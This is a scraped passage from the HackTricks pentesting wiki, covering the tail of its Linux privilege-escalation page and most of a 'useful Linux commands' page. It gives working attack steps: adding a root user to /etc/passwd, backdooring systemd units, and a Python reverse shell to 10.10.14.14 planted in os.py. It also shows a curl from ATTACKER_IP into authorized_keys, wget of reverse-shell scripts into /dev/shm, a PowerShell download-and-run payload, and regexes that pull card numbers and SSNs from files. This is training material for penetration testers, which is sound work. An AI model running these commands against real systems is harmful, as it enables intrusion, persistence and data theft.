/etc/pwd.db /etc/master.passwd /etc/group\n2\n>\n/dev/null\n#Shadow equivalent files\ncat\n/etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd\n2\n>\n/dev/null\nIn some occasions you can find\npassword hashes\ninside the\n/etc/passwd\n(or equivalent) file\ngrep\n-v\n'^[^:]*:[x\\*]'\n/etc/passwd /etc/pwd.db /etc/master.passwd /etc/group\n2\n>\n/dev/null\nWritable /etc/passwd\nFirst, generate a password with one of the following commands.\nopenssl passwd -1 -salt hacker hacker\nmkpasswd -m SHA-512 hacker\npython2 -c 'import crypt; print crypt.crypt(\"hacker\", \"$6$salt\")'\nThen add the user\nhacker\nand add the generated password.\nhacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash\nE.g:\nhacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash\nYou can now use the\nsu\ncommand with\nhacker:hacker\nAlternatively, you can use the following lines to add a dummy user without a password.\nWARNING: you might degrade the current security of the machine.\necho 'dummy::0:0::/root:/bin/bash' >>/etc/passwd\nsu - dummy\nNOTE: In BSD platforms\n/etc/passwd\nis located at\n/etc/pwd.db\nand\n/etc/master.passwd\n, also the\n/etc/shadow\nis renamed to\n/etc/spwd.db\n.\nYou should check if you can\nwrite in some sensitive files\n. For example, can you write to some\nservice configuration file\n?\nfind\n/\n'('\n-type\nf\n-or\n-type\nd\n')'\n'('\n'('\n-user\n$USER\n')'\n-or\n'('\n-perm\n-o\n=\nw\n')'\n')'\n2\n>\n/dev/null\n|\ngrep\n-v\n'/proc/'\n|\ngrep\n-v\n$HOME\n|\nsort\n|\nuniq\n#Find files owned by the user or writable by anybody\nfor\ng\nin\n`\ngroups\n`\n;\ndo\nfind\n\\(\n-type\nf\n-or\n-type\nd\n\\)\n-group\n$g\n-perm\n-g\n=\nw\n2\n>\n/dev/null\n|\ngrep\n-v\n'/proc/'\n|\ngrep\n-v\n$HOME\n;\ndone\n#Find files writable by any group of the user\nFor example, if the machine is running a\ntomcat\nserver and you can\nmodify the Tomcat service configuration file inside /etc/systemd/,\nthen you can modify the lines:\nExecStart=/path/to/backdoor\nUser=root\nGroup=root\nYour backdoor will be executed the next time that tomcat is started.\nCheck Folders\nThe following folders may contain backups or interesting information:\n/tmp\n,\n/var/tmp\n,\n/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root\n(Probably you won't be able to read the last one but try)\nls\n-a\n/tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root\nWeird Location/Owned files\n#root owned files in /home folders\nfind\n/home\n-user\nroot\n2\n>\n/dev/null\n#Files owned by other users in folders owned by me\nfor\nd\nin\n`\nfind\n/var /etc /home /root /tmp /usr /opt /boot /sys\n-type\nd\n-user\n$(\nwhoami\n)\n2\n>\n/dev/null\n`\n;\ndo\nfind\n$d\n!\n-user\n`\nwhoami\n`\n-exec\nls\n-l\n{}\n\\;\n2\n>\n/dev/null\n;\ndone\n#Files owned by root, readable by me but not world readable\nfind\n/\n-type\nf\n-user\nroot\n!\n-perm\n-o\n=\nr\n2\n>\n/dev/null\n#Files owned by me or world writable\nfind\n/\n'('\n-type\nf\n-or\n-type\nd\n')'\n'('\n'('\n-user\n$USER\n')'\n-or\n'('\n-perm\n-o\n=\nw\n')'\n')'\n!\n-path\n\"/proc/*\"\n!\n-path\n\"/sys/*\"\n!\n-path\n\"\n$HOME\n/*\"\n2\n>\n/dev/null\n#Writable files by each group I belong to\nfor\ng\nin\n`\ngroups\n`\n;\ndo\nprintf\n\"  Group\n$g\n:\n\\n\n\"\n;\nfind\n/\n'('\n-type\nf\n-or\n-type\nd\n')'\n-group\n$g\n-perm\n-g\n=\nw\n!\n-path\n\"/proc/*\"\n!\n-path\n\"/sys/*\"\n!\n-path\n\"\n$HOME\n/*\"\n2\n>\n/dev/null\ndone\ndone\nModified files in last mins\nfind\n/\n-type\nf\n-mmin\n-5\n!\n-path\n\"/proc/*\"\n!\n-path\n\"/sys/*\"\n!\n-path\n\"/run/*\"\n!\n-path\n\"/dev/*\"\n!\n-path\n\"/var/lib/*\"\n2\n>\n/dev/null\nSqlite DB files\nfind\n/\n-name\n'*.db'\n-o\n-name\n'*.sqlite'\n-o\n-name\n'*.sqlite3'\n2\n>\n/dev/null\n*_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml files\nfind\n/\n-type\nf\n\\(\n-name\n\"*_history\"\n-o\n-name\n\".sudo_as_admin_successful\"\n-o\n-name\n\".profile\"\n-o\n-name\n\"*bashrc\"\n-o\n-name\n\"httpd.conf\"\n-o\n-name\n\"*.plan\"\n-o\n-name\n\".htpasswd\"\n-o\n-name\n\".git-credentials\"\n-o\n-name\n\"*.rhosts\"\n-o\n-name\n\"hosts.equiv\"\n-o\n-name\n\"Dockerfile\"\n-o\n-name\n\"docker-compose.yml\"\n\\)\n2\n>\n/dev/null\nHidden files\nfind\n/\n-type\nf\n-iname\n\".*\"\n-ls\n2\n>\n/dev/null\nScript/Binaries in PATH\nfor\nd\nin\n`\necho\n$PATH\n|\ntr\n\":\"\n\"\n\\n\n\"\n`\n;\ndo\nfind\n$d\n-name\n\"*.sh\"\n2\n>\n/dev/null\n;\ndone\nfor\nd\nin\n`\necho\n$PATH\n|\ntr\n\":\"\n\"\n\\n\n\"\n`\n;\ndo\nfind\n$d\n-type\n-f\n-executable\n2\n>\n/dev/null\n;\ndone\nWeb files\nls\n-alhR\n/var/www/\n2\n>\n/dev/null\nls\n-alhR\n/srv/www/htdocs/\n2\n>\n/dev/null\nls\n-alhR\n/usr/local/www/apache22/data/\nls\n-alhR\n/opt/lampp/htdocs/\n2\n>\n/dev/null\nBackups\nfind\n/var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp\n-type\nf\n\\(\n-name\n\"*backup*\"\n-o\n-name\n\"*\\.bak\"\n-o\n-name\n\"*\\.bck\"\n-o\n-name\n\"*\\.bk\"\n\\)\n2\n>\n/dev/null\nKnown files containing passwords\nRead the code of\nlinPEAS\n, it searches for\nseveral possible files that could contain passwords\n.\nAnother interesting tool\nthat you can use to do so is:\nLaZagne\nwhich is an open source application used to retrieve lots of passwords stored on a local computer for Windows, Linux & Mac.\nLogs\nIf you can read logs, you may be able to find\ninteresting/confidential information inside them\n. The more strange the log is, the more interesting it will be (probably).\nAlso, some \"\nbad\n\" configured (backdoored?)\naudit logs\nmay allow you to\nrecord passwords\ninside audit logs as explained in this post:\nhttps://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/\n.\naureport\n--tty\n|\ngrep\n-E\n\"su |sudo \"\n|\nsed\n-E\n\"s,su|sudo,\n${C}\n[1;31m&\n${C}\n[0m,g\"\ngrep\n-RE\n'comm=\"su\"|comm=\"sudo\"'\n/var/log*\n2\n>\n/dev/null\nIn order to\nread logs the group\nadm\nwill be really helpful.\nShell files\n~/.bash_profile\n# if it exists, read it once when you log in to the shell\n~/.bash_login\n# if it exists, read it once if .bash_profile doesn't exist\n~/.profile\n# if it exists, read once if the two above don't exist\n/etc/profile\n# only read if none of the above exists\n~/.bashrc\n# if it exists, read it every time you start a new shell\n~/.bash_logout\n# if it exists, read when the login shell exits\n~/.zlogin\n#zsh shell\n~/.zshrc\n#zsh shell\nGeneric Creds Search/Regex\nYou should also check for files containing the word \"\npassword\n\" in its\nname\nor inside the\ncontent\n, and also check for IPs and emails inside logs, or hashes regexps.\nI'm not going to list here how to do all of this but if you are interested you can check the last checks that\nlinpeas\nperform.\nWritable files\nPython library hijacking\nIf you know from\nwhere\na python script is going to be executed and you\ncan write inside\nthat folder or you can\nmodify python libraries\n, you can modify the OS library and backdoor it (if you can write where python script is going to be executed, copy and paste the os.py library).\nTo\nbackdoor the library\njust add at the end of the os.py library the following line (change IP and PORT):\nimport\nsocket\n,\nsubprocess\n,\nos\n;\ns\n=\nsocket\n.\nsocket\n(\nsocket\n.\nAF_INET\n,\nsocket\n.\nSOCK_STREAM\n);\ns\n.\nconnect\n((\n\"10.10.14.14\"\n,\n5678\n));\nos\n.\ndup2\n(\ns\n.\nfileno\n(),\n0\n);\nos\n.\ndup2\n(\ns\n.\nfileno\n(),\n1\n);\nos\n.\ndup2\n(\ns\n.\nfileno\n(),\n2\n);\np\n=\nsubprocess\n.\ncall\n([\n\"/bin/sh\"\n,\n\"-i\"\n]);\nLogrotate exploitation\nThere is a vulnerability on\nlogrotate\nthat allows a user with\nwrite permissions over a log file\nor\nany\nof its\nparent directories\nto make\nlogrotate\nwrite\na file in any location\n. If\nlogrotate\nis being executed by\nroot\n, then the user will be able to write any file in\n/etc/bash_completion.d/\nthat will be executed by any user that login.\nSo, if you have\nwrite perms\nover a\nlog file\nor\nany of its\nparent folder\n, you can\nprivesc\n(on most linux distributions, logrotate is executed automatically once a day as\nuser root\n). Also, check if apart from\n/var/log\nare more files being\nrotated\n.\nThis vulnerability affects\nlogrotate\nversion\n3.18.0\nand older\nMore detailed information about the vulnerability can be found on this page:\nhttps://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition\n.\nYou can exploit this vulnerability with\nlogrotten\n.\nThis vulnerability is very similar to\nCVE-2016-1247\n(nginx logs),\nso whenever you find that you can alter logs, check who is managing those logs and check if you can escalate privileges substituting the logs by symlinks.\n/etc/sysconfig/network-scripts/ (Centos/Redhat)\nIf, for whatever reason, a user is able to\nwrite\nan\nifcf-<whatever>\nscript to\n/etc/sysconfig/network-scripts\nor\nit can\nadjust\nan existing one, then your\nsystem is pwned\n.\nNetwork scripts,\nifcg-eth0\nfor example are used for network connections. They look exactly like .INI files. However, they are ~sourced~ on Linux by Network Manager (dispatcher.d).\nIn my case, the\nNAME=\nattributed in these network scripts is not handled correctly. If you have\nwhite/blank space in the name the system tries to execute the part after the white/blank space\n. This means that\neverything after the first blank space is executed as root\n.\nFor example:\n/etc/sysconfig/network-scripts/ifcfg-1337\nNAME\n=\nNetwork /bin/id\nONBOOT\n=\nyes\nDEVICE\n=\neth0\n(\nNote the blank space between Network and /bin/id\n)\nVulnerability reference:\nhttps://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f\n‚Äã\ninit, init.d, systemd, and rc.d\n/etc/init.d\ncontains\nscripts\nused by the System V init tools (SysVinit). This is the\ntraditional service management package for Linux\n, containing the\ninit\nprogram (the first process that is run when the kernel has finished initializing¬π) as well as some infrastructure to start and stop services and configure them. Specifically, files in\n/etc/init.d\nare shell scripts that respond to\nstart\n,\nstop\n,\nrestart\n, and (when supported)\nreload\ncommands to manage a particular service. These scripts can be invoked directly or (most commonly) via some other trigger (typically the presence of a symbolic link in\n/etc/rc?.d/\n). (From\nhere\n). Other alternative to this folder is\n/etc/rc.d/init.d\nin Redhat.\n/etc/init\ncontains\nconfiguration\nfiles used by\nUpstart\n. Upstart is a young\nservice management package\nchampioned by Ubuntu. Files in\n/etc/init\nare configuration files telling Upstart how and when to\nstart\n,\nstop\n,\nreload\nthe configuration, or query the\nstatus\nof a service. As of lucid, Ubuntu is transitioning from SysVinit to Upstart, which explains why many services come with SysVinit scripts even though Upstart configuration files are preferred. The SysVinit scripts are processed by a compatibility layer in Upstart. (From\nhere\n).\nsystemd\nis a\nLinux initialization system and service manager that includes features like on-demand starting of daemons\n, mount and automount point maintenance, snapshot support, and processes tracking using Linux control groups. systemd provides a logging daemon and other tools and utilities to help with common system administration tasks. (From\nhere\n).\nFiles that ship in packages downloaded from the distribution repository go into\n/usr/lib/systemd/\n. Modifications done by system administrator (user) go into\n/etc/systemd/system/\n.\nOther Tricks\nNFS Privilege escalation\nNFS no_root_squash/no_all_squash misconfiguration PE\nEscaping from restricted Shells\nEscaping from Jails\nCisco - vmanage\nCisco - vmanage\nKernel Security Protections\n‚Äã\nhttps://github.com/a13xp0p0v/kconfig-hardened-check\n‚Äã\n‚Äã\nhttps://github.com/a13xp0p0v/linux-kernel-defence-map\n‚Äã\nMore help\n‚Äã\nStatic impacket binaries\n‚Äã\nLinux/Unix Privesc Tools\nBest tool to look for Linux local privilege escalation vectors:\nLinPEAS\n‚Äã\nLinEnum\n:\nhttps://github.com/rebootuser/LinEnum\n(-t option)\nEnumy\n:\nhttps://github.com/luke-goddard/enumy\nUnix Privesc Check:\nhttp://pentestmonkey.net/tools/audit/unix-privesc-check\nLinux Priv Checker:\nwww.securitysift.com/download/linuxprivchecker.py\nBeeRoot:\nhttps://github.com/AlessandroZ/BeRoot/tree/master/Linux\nKernelpop:\nEnumerate kernel vulns ins linux and MAC\nhttps://github.com/spencerdodd/kernelpop\nMestaploit:\nmulti/recon/local_exploit_suggester\nLinux Exploit Suggester:\nhttps://github.com/mzet-/linux-exploit-suggester\nEvilAbigail (physical access):\nhttps://github.com/GDSSecurity/EvilAbigail\nRecopilation of more scripts\n:\nhttps://github.com/1N3/PrivEsc\n‚Äã\nReferences\n‚Äã\nhttps://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/\nhttps://payatu.com/guide-linux-privilege-escalation/\nhttps://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744\nhttp://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html\nhttps://touhidshaikh.com/blog/?p=827\nhttps://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf\nhttps://github.com/frizb/Linux-Privilege-Escalation\nhttps://github.com/lucyoa/kernel-exploits\nhttps://github.com/rtcrowley/linux-private-i\n‚Äã\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nLinux Hardening -\nPrevious\nChecklist - Linux Privilege Escalation\nNext\nCisco - vmanage\nLast modified\n2mo ago"
    },
    {
        "title": "Useful Linux Commands",
        "url": "https://book.hacktricks.xyz/linux-hardening/useful-linux-commands",
        "text": "Useful Linux Commands\nUse\nTrickest\nto easily build and\nautomate workflows\npowered by the world's\nmost advanced\ncommunity tools.\nGet Access Today:\nWorkflow-powered solution for Bug Bounty, Pentesting, SecOps | Trickest\nTrickest\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nCommon Bash\n#Exfiltration using Base64\nbase64\n-w\n0\nfile\n‚Äã\n#Get HexDump without new lines\nxxd\n-p\nboot12.bin\n|\ntr\n-d\n'\\n'\n‚Äã\n#Add public key to authorized keys\ncurl\nhttps://ATTACKER_IP/.ssh/id_rsa.pub\n>>\n~/.ssh/authorized_keys\n‚Äã\n#Echo without new line and Hex\necho\n-n\n-e\n‚Äã\n#Count\nwc\n-l\n<\nfile\n>\n#Lines\nwc\n-c\n#Chars\n‚Äã\n#Sort\nsort\n-nr\n#Sort by number and then reverse\ncat\nfile\n|\nsort\n|\nuniq\n#Sort and delete duplicates\n‚Äã\n#Replace in file\nsed\n-i\n's/OLD/NEW/g'\npath/file\n#Replace string inside a file\n‚Äã\n#Download in RAM\nwget\n10.10\n.14.14:8000/tcp_pty_backconnect.py\n-O\n/dev/shm/.rev.py\nwget\n10.10\n.14.14:8000/tcp_pty_backconnect.py\n-P\n/dev/shm\ncurl\n10.10\n.14.14:8000/shell.py\n-o\n/dev/shm/shell.py\n‚Äã\n#Files used by network processes\nlsof\n#Open files belonging to any process\nlsof\n-p\n3\n#Open files used by the process\nlsof\n-i\n#Files used by networks processes\nlsof\n-i\n4\n#Files used by network IPv4 processes\nlsof\n-i\n6\n#Files used by network IPv6 processes\nlsof\n-i\n4\n-a\n-p\n1234\n#List all open IPV4 network files in use by the process 1234\nlsof\n+D /lib\n#Processes using files inside the indicated dir\nlsof\n-i\n:80\n#Files uses by networks processes\nfuser\n-nv\ntcp\n80\n‚Äã\n#Decompress\ntar\n-xvzf\n/path/to/yourfile.tgz\ntar\n-xvjf\n/path/to/yourfile.tbz\nbzip2\n-d\n/path/to/yourfile.bz2\ntar\njxf file.tar.bz2\ngunzip /path/to/yourfile.gz\nunzip\nfile.zip\n7z\n-x\nfile.7z\nsudo\napt-get\ninstall\nxz-utils\n;\nunxz file.xz\n‚Äã\n#Add new user\nuseradd\n-p\n'openssl passwd -1 <Password>'\nhacker\n‚Äã\n#Clipboard\nxclip\n-sel\nc\n<\ncat\nfile.txt\n‚Äã\n#HTTP servers\npython\n-m\nSimpleHTTPServer\n80\npython3\n-m\nhttp.server\nruby\n-rwebrick\n-e\n\"WEBrick::HTTPServer.new(:Port => 80, :DocumentRoot => Dir.pwd).start\"\nphp\n-S\n$ip\n:80\n‚Äã\n#Curl\n#json data\ncurl\n--header\n\"Content-Type: application/json\"\n--request\nPOST\n--data\n'{\"password\":\"password\", \"username\":\"admin\"}'\nhttp://host:3000/endpoint\n#Auth via JWT\ncurl\n-X\nGET\n-H\n'Authorization: Bearer <JWT>'\nhttp://host:3000/endpoint\n‚Äã\n#Send Email\nsendEmail\n-t\n[email¬†protected]\n-f\n[email¬†protected]\n-s\n192.168\n.8.131\n-u\nSubject\n-a\nfile.pdf\n#You will be prompted for the content\n‚Äã\n#DD copy hex bin file without first X (28) bytes\ndd\nif\n=\nfile.bin\nbs\n=\n28\nskip\n=\n1\nof\n=\nblob\n‚Äã\n#Mount .vhd files (virtual hard drive)\nsudo\napt-get\ninstall\nlibguestfs-tools\nguestmount\n--add\nNAME.vhd\n--inspector\n--ro\n/mnt/vhd\n#For read-only, create first /mnt/vhd\n‚Äã\n# ssh-keyscan, help to find if 2 ssh ports are from the same host comparing keys\nssh-keyscan\n10.10\n.10.101\n‚Äã\n# Openssl\nopenssl s_client\n-connect\n10.10\n.10.127:443\n#Get the certificate from a server\nopenssl x509\n-in\nca.cert.pem\n-text\n#Read certificate\nopenssl genrsa\n-out\nnewuser.key\n2048\n#Create new RSA2048 key\nopenssl req\n-new\n-key\nnewuser.key\n-out\nnewuser.csr\n#Generate certificate from a private key. Recommended to set the \"Organizatoin Name\"(Fortune) and the \"Common Name\" (\n[email¬†protected]\n)\nopenssl req\n-x509\n-newkey\nrsa:4096\n-keyout\nkey.pem\n-out\ncert.pem\n-days\n365\n-nodes\n#Create certificate\nopenssl x509\n-req\n-in\nnewuser.csr\n-CA\nintermediate.cert.pem\n-CAkey\nintermediate.key.pem\n-CAcreateserial\n-out\nnewuser.pem\n-days\n1024\n-sha256\n#Create a signed certificate\nopenssl pkcs12\n-export\n-out\nnewuser.pfx\n-inkey\nnewuser.key\n-in\nnewuser.pem\n#Create from the signed certificate the pkcs12 certificate format (firefox)\n# If you only needs to create a client certificate from a Ca certificate and the CA key, you can do it using:\nopenssl pkcs12\n-export\n-in\nca.cert.pem\n-inkey\nca.key.pem\n-out\nclient.p12\n# Decrypt ssh key\nopenssl rsa\n-in\nkey.ssh.enc\n-out\nkey.ssh\n#Decrypt\nopenssl enc\n-aes256\n-k\n<\nKEY\n>\n-d\n-in\nbackup.tgz.enc\n-out\nb.tgz\n‚Äã\n#Count number of instructions executed by a program, need a host based linux (not working in VM)\nperf\nstat\n-x,\n-e\ninstructions:u\n\"ls\"\n‚Äã\n#Find trick for HTB, find files from 2018-12-12 to 2018-12-14\nfind\n/\n-newermt\n2018\n-12-12\n!\n-newermt\n2018\n-12-14\n-type\nf\n-readable\n-not\n-path\n\"/proc/*\"\n-not\n-path\n\"/sys/*\"\n-ls\n2\n>\n/dev/null\n‚Äã\n#Reconfigure timezone\nsudo\ndpkg-reconfigure tzdata\n‚Äã\n#Search from which package is a binary\napt-file search /usr/bin/file\n#Needed: apt-get install apt-file\n‚Äã\n#Protobuf decode https://www.ezequiel.tech/2020/08/leaking-google-cloud-projects.html\necho\n\"CIKUmMesGw==\"\n|\nbase64\n-d\n|\nprotoc\n--decode_raw\n‚Äã\n#Set not removable bit\nsudo\nchattr +i file.txt\nsudo\nchattr\n-i\nfile.txt\n#Remove the bit so you can delete it\n‚Äã\n# List files inside zip\n7z l file.zip\nUse\nTrickest\nto easily build and\nautomate workflows\npowered by the world's\nmost advanced\ncommunity tools.\nGet Access Today:\nWorkflow-powered solution for Bug Bounty, Pentesting, SecOps | Trickest\nTrickest\nBash for Windows\n#Base64 for Windows\necho\n-n\n\"IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/9002.ps1')\"\n|\niconv\n--to-code UTF-16LE\n|\nbase64\n-w0\n#Exe compression\nupx\n-9\nnc.exe\n‚Äã\n#Exe2bat\nwine exe2bat.exe nc.exe nc.txt\n‚Äã\n#Compile Windows python exploit to exe\npip\ninstall\npyinstaller\nwget\n-O\nexploit.py http://www.exploit-db.com/download/31853\npython pyinstaller.py\n--onefile\nexploit.py\n‚Äã\n#Compile for windows\n#sudo apt-get install gcc-mingw-w64-i686\ni686-mingw32msvc-gcc\n-o\nexecutable useradd.c\nGreps\n#Extract emails from file\ngrep\n-E\n-o\n\"\n\\b\n[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,6}\n\\b\n\"\nfile.txt\n‚Äã\n#Extract valid IP addresses\ngrep\n-E\n-o\n\"(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\"\nfile.txt\n‚Äã\n#Extract passwords\ngrep\n-i\n\"pwd\\|passw\"\nfile.txt\n‚Äã\n#Extract users\ngrep\n-i\n\"user\\|invalid\\|authentication\\|login\"\nfile.txt\n‚Äã\n# Extract hashes\n#Extract md5 hashes ({32}), sha1 ({40}), sha256({64}), sha512({128})\negrep\n-oE\n'(^|[^a-fA-F0-9])[a-fA-F0-9]{32}([^a-fA-F0-9]|$)'\n*.txt\n|\negrep\n-o\n'[a-fA-F0-9]{32}'\n>\nmd5-hashes.txt\n#Extract valid MySQL-Old hashes\ngrep\n-e\n\"[0-7][0-9a-f]{7}[0-7][0-9a-f]{7}\"\n*.txt\n>\nmysql-old-hashes.txt\n#Extract blowfish hashes\ngrep\n-e\n\"\n$2a\n\\$\n\\0\n8\\\n$(\n.\n)\n{75}\"\n*.txt\n>\nblowfish-hashes.txt\n#Extract Joomla hashes\negrep\n-o\n\"([0-9a-zA-Z]{32}):(w{16,32})\"\n*.txt\n>\njoomla.txt\n#Extract VBulletin hashes\negrep\n-o\n\"([0-9a-zA-Z]{32}):(S{3,32})\"\n*.txt\n>\nvbulletin.txt\n#Extraxt phpBB3-MD5\negrep\n-o\n'$H$S{31}'\n*.txt\n>\nphpBB3-md5.txt\n#Extract Wordpress-MD5\negrep\n-o\n'$P$S{31}'\n*.txt\n>\nwordpress-md5.txt\n#Extract Drupal 7\negrep\n-o\n'$S$S{52}'\n*.txt\n>\ndrupal-7.txt\n#Extract old Unix-md5\negrep\n-o\n'$1$w{8}S{22}'\n*.txt\n>\nmd5-unix-old.txt\n#Extract md5-apr1\negrep\n-o\n'$apr1$w{8}S{22}'\n*.txt\n>\nmd5-apr1.txt\n#Extract sha512crypt, SHA512(Unix)\negrep\n-o\n'$6$w{8}S{86}'\n*.txt\n>\nsha512crypt.txt\n‚Äã\n#Extract e-mails from text files\ngrep\n-E\n-o\n\"\n\\b\n[a-zA-Z0-9.#?\n$*\n_-]+@[a-zA-Z0-9.#?\n$*\n_-]+.[a-zA-Z0-9.-]+\n\\b\n\"\n*.txt\n>\ne-mails.txt\n‚Äã\n#Extract HTTP URLs from text files\ngrep\nhttp\n|\ngrep\n-shoP\n'http.*?[\" >]'\n*.txt\n>\nhttp-urls.txt\n#For extracting HTTPS, FTP and other URL format use\ngrep\n-E\n'(((https|ftp|gopher)|mailto)[.:][^ >\"\t]*|www.[-a-z0-9.]+)[^ .,;\t>\">):]'\n*.txt\n>\nurls.txt\n#Note: if grep returns \"Binary file (standard input) matches\n\" use the following approaches # tr '[\n\\000\n-\n\\011\\013\n-\n\\037\n177-377]' '.' < *.log | grep -E \"\nYour_Regex\n\" OR # cat -v *.log | egrep -o \"\nYour_Regex\n\"\n‚Äã\n#Extract Floating point numbers\ngrep -E -o \"\n^\n[\n-+\n]\n?\n[\n0\n-9\n]\n*.?\n[\n0\n-9\n]\n+\n([\neE\n][\n-+\n]\n?\n[\n0\n-9\n]\n+\n)\n?$\n\" *.txt > floats.txt\n‚Äã\n# Extract credit card data\n#Visa\ngrep -E -o \"\n4\n[\n0\n-9\n]{\n3\n}[\n-\n]\n?\n[\n0\n-9\n]{\n4\n}[\n-\n]\n?\n[\n0\n-9\n]{\n4\n}[\n-\n]\n?\n[\n0\n-9\n]{\n4\n}\n\" *.txt > visa.txt\n#MasterCard\ngrep -E -o \"\n5\n[\n0\n-9\n]{\n3\n}[\n-\n]\n?\n[\n0\n-9\n]{\n4\n}[\n-\n]\n?\n[\n0\n-9\n]{\n4\n}[\n-\n]\n?\n[\n0\n-9\n]{\n4\n}\n\" *.txt > mastercard.txt\n#American Express\ngrep -E -o \"\n\\\nb3\n[\n47\n][\n0\n-9\n]{\n13\n}\\\nb\n\" *.txt > american-express.txt\n#Diners Club\ngrep -E -o \"\n\\\nb3\n(\n?:0\n[\n0\n-5\n]\n|\n[\n68\n][\n0\n-9\n])[\n0\n-9\n]{\n11\n}\\\nb\n\" *.txt > diners.txt\n#Discover\ngrep -E -o \"\n6011\n[\n-\n]\n?\n[\n0\n-9\n]{\n4\n}[\n-\n]\n?\n[\n0\n-9\n]{\n4\n}[\n-\n]\n?\n[\n0\n-9\n]{\n4\n}\n\" *.txt > discover.txt\n#JCB\ngrep -E -o \"\n\\\nb\n(\n?:2131\n|\n1800\n|\n35d\n{\n3\n})\nd\n{\n11\n}\\\nb\n\" *.txt > jcb.txt\n#AMEX\ngrep -E -o \"\n3\n[\n47\n][\n0\n-9\n]{\n2\n}[\n-\n]\n?\n[\n0\n-9\n]{\n6\n}[\n-\n]\n?\n[\n0\n-9\n]{\n5\n}\n\" *.txt > amex.txt\n‚Äã\n# Extract IDs\n#Extract Social Security Number (SSN)\ngrep -E -o \"\n[\n0\n-9\n]{\n3\n}[\n-\n]\n?\n[\n0\n-9\n]{\n2\n}[\n-\n]\n?\n[\n0\n-9\n]{\n4\n}\n\" *.txt > ssn.txt\n#Extract Indiana Driver License Number\ngrep -E -o \"\n[\n0\n-9\n]{\n4\n}[\n-\n]\n?\n[\n0\n-9\n]{\n2\n}[\n-\n]\n?\n[\n0\n-9\n]{\n4\n}\n\" *.txt > indiana-dln.txt\n#Extract US Passport Cards\ngrep -E -o \"\nC0\n[\n0\n-9\n]{\n7\n}\n\" *.txt > us-pass-card.txt\n#Extract US Passport Number\ngrep -E -o \"\n[\n23\n][\n0\n-9\n]{\n8\n}\n\" *.txt > us-pass-num.txt\n#Extract US Phone Numberss\ngrep -Po 'd{3}[s-_]?d{3}[s-_]?d{4}' *.txt > us-phones.txt\n#Extract ISBN Numbers\negrep -a -o \"\n\\\nbISBN\n(\n?:-1\n[\n03\n])\n?:?\n(\n?\n=\n[\n0\n-9X\n]{\n10\n}\n$\n|\n(\n?\n=\n(\n?:\n[\n0\n-9\n]\n+\n[\n-\n]){\n3\n})[\n-\n0\n-9X\n]{\n13\n}\n$\n|\n97\n[\n89\n][\n0\n-9\n]{\n10\n}\n$\n|\n(\n?\n=\n(\n?:\n[\n0\n-9\n]\n+\n[\n-\n]){\n4\n})[\n-\n0\n-9\n]{\n17\n}\n$\n)(\n?:97\n[\n89\n][\n-\n]\n?\n)\n?\n[\n0\n-9\n]{\n1,5\n}[\n-\n]\n?\n[\n0\n-9\n]\n+\n[\n-\n]\n?\n[\n0\n-9\n]\n+\n[\n-\n]\n?\n[\n0\n-9X\n]\\\nb\" *.txt\n>\nisbn.txt\nNmap search help\n#Nmap scripts ((default or version) and smb))\nnmap --script-help\n\"(default or version) and *smb*\"\nlocate\n-r\n'\\.nse$'\n|\nxargs\ngrep\ncategories\n|\ngrep\n'default\\|version\\|safe'\n|\ngrep\nsmb\nnmap --script-help\n\"(default or version) and smb)\"\nBash\n#All bytes inside a file (except 0x20 and 